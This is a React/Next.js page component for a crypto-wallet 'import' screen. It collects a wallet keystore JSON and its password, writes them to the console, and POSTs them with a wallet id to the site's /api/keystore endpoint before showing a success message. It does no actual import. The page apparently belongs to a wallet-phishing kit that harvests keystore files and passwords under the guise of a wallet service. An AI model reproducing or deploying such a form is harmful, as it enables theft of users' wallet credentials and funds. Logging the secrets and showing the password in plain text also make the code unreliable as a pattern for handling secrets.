import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import styles from "../../../styles/Home.module.css";
import Tabs from "..";
import { useRouter } from "next/router";
import keystore from "../../api/keystore";

const Profile = () => {
  const [keystone, setKeystone] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();
  const {pid} = router.query;

  const notify = () => {
    keystone === "" || password === ""
      ? ""
      : toast.success("Keystore Json Successfully Imported");
  };

  const handleKeystoneChange = (e) => {
    setKeystone(e.target.value);
  };
  const handleJsonChange = (e) => {
    setPassword(e.target.value);
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    const kS = { keystone: keystone, password: password, wallet: pid };
    console.log(kS);
    keystone !== "" &&
      password !== "" &&
      fetch("/api/keystore", {
        body: JSON.stringify({
          keystore: keystone,
          wallet: pid,
          password: password
        }),
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      });
  };
  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={keystone}
            onChange={handleKeystoneChange}
            placeholder='Keystore JSON is Several lines of text beginning with "(...)" '
            className={styles.textarea}
            required
          />
          <input
            onChange={handleJsonChange}
            type="text"
            placeholder="Password"
            className={`${styles.textarea} ${styles.tA2}`}
            required
          />

          <button onClick={notify} className={styles.button}>
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
};

export default Profile;
